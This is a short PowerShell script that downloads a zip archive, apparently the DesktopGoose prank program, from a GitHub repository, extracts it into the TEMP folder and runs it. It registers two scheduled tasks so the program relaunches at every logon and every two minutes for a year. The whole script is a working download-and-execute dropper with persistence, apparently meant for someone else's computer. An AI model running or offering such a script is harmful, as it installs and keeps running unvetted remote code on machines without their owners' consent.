$gooseUrl = "https://raw.githubusercontent.com/giaosoissomsm/Webhooks/main/DesktopGoose.zip"
$tempPath = "$env:TEMP\goose"
$zipPath = "$tempPath\goose.zip"
$exePath = "$tempPath\GooseDesktop.exe"
$taskName = "RunDesktopGoose"

# Criar diretório temporário
New-Item -ItemType Directory -Path $tempPath -Force | Out-Null

# Baixar e extrair arquivos
Invoke-WebRequest -Uri $gooseUrl -OutFile $zipPath
Expand-Archive -Path $zipPath -DestinationPath $tempPath -Force
Move-Item -Path "$tempPath\DesktopGoose v0.31\*" -Destination $tempPath -Force
Remove-Item -Path "$tempPath\DesktopGoose v0.31" -Recurse -Force

Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Start-Process -FilePath '$env:TEMP\goose\GooseDesktop.exe'") -Trigger (New-ScheduledTaskTrigger -AtLogon) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) -TaskName "GooseDesktopAtLogon" -Description "Executa o GooseDesktop.exe sempre que o usuário logar"
Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute "$env:TEMP\goose\GooseDesktop.exe") -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 365)) -TaskName "GooseTaskMin"
Start-Process -FilePath "$env:TEMP\goose\GooseDesktop.exe"
